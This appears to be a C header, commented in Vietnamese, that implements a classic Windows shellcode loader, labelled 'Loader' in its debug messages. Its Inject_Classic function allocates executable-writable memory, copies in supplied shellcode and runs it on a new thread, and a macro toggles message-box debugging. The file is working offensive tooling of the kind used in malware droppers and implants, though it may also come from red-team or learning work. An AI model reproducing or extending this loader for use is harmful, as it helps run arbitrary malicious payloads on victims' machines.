#pragma once
#include <windows.h>

// Chúng ta tạo một macro tiện lợi
// Nếu DEBUG_MODE được định nghĩa, DEBUG_MSG sẽ tạo một MessageBox
// Nếu không, DEBUG_MSG sẽ không làm gì cả (bị trình biên dịch loại bỏ)
#ifdef DEBUG_MODE
    #define DEBUG_MSG(title, msg) MessageBoxA(NULL, msg, title, MB_OK)
#else
    #define DEBUG_MSG(title, msg)
#endif

void Inject_Classic(unsigned char* shellcode, int shellcode_len) {
    DEBUG_MSG("Debug Step 1", "Loader started. Attempting to allocate memory...");

    // 1. Cấp phát bộ nhớ
    LPVOID mem = VirtualAlloc(NULL, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (mem == NULL) {
        DEBUG_MSG("Debug Error", "VirtualAlloc FAILED!");
        return;
    }
    
    DEBUG_MSG("Debug Step 2", "Memory allocated. Copying shellcode...");
    
    // 2. Sao chép shellcode
    RtlMoveMemory(mem, shellcode, shellcode_len);
    
    DEBUG_MSG("Debug Step 3", "Shellcode copied. Creating thread...");

    // 3. Tạo luồng
    HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
    if (thread == NULL) {
        DEBUG_MSG("Debug Error", "CreateThread FAILED!");
        VirtualFree(mem, 0, MEM_RELEASE);
        return;
    }
    
    DEBUG_MSG("Debug Step 4", "Thread created. Waiting for it to finish...");
    
    // 4. Chờ luồng hoàn thành
    WaitForSingleObject(thread, INFINITE);

    DEBUG_MSG("Debug Step 5", "Thread finished. Loader exiting.");
}